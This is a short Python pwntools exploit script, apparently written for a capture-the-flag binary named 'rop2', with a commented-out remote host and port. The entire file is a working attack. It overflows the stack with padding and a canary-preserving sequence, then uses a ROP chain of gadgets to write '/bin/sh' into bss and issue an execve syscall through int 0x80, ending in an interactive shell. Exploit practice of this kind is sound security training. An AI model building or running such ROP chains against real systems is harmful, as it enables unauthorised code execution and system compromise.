from pwn import *

p = process("./rop2")
#p = remote("45.122.249.68", 10006)

pad = "a" * 4
cana = p32(0x0806c500) + p32(0x080da000) + p32(0x0804892a) + p32(0x000003e9) +  p32(0x080da000) + p32(0xffff1d58)  #+ p32(0x08048932) 

pop_eax_ret= 0x080a8e36
pop_ebx_ret= 0x080481c9
bss = 0x080db320
mov_ret = 0x080a6356
pop_edx_ecx_ebx_ret = 0x0806ee91
int_0x80 = 0x08049563


payload = pad + cana

payload += p32(pop_eax_ret)
payload += "/bin"
payload += p32(pop_ebx_ret)
payload += p32(bss)
payload += p32(mov_ret)
payload += "A" * 40
payload += p32(bss + 4)
payload +=  p32(pop_eax_ret)
payload += "/sh\x00"
payload += p32(mov_ret)
payload += "A" * 40
payload += p32(bss)
payload += p32(pop_eax_ret)
payload += p32(0xb)
payload += p32(pop_edx_ecx_ebx_ret)
payload += p32(0)
payload += p32(0)
payload += p32(bss)
payload += p32(int_0x80)


p.sendline(payload)
p.interactive()
